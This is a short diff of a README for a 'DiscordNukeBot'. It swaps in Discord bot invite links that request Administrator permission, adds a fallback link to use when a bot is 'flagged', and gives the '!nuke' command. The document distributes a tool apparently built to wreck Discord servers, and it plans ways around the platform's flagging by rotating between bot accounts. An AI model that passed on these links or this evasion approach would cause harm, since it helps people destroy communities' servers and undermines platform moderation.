@@ -1,5 +1,8 @@
 # DiscordNukeBot
 
-if bot offline wait 3-5 m
+Invite Link : https://discord.com/api/oauth2/authorize?client_id=1024061473904918609&permissions=8&scope=bot
 
-Invite Link : https://discord.com/api/oauth2/authorize?client_id=1023667990425772103&permissions=8&scope=bot
+
+
+if bot flagged use this link: https://discord.com/api/oauth2/authorize?client_id=1024062600511758346&permissions=8&scope=bot
+about this v1 bot use this bot when v2 is flagged use !nuke for this bot
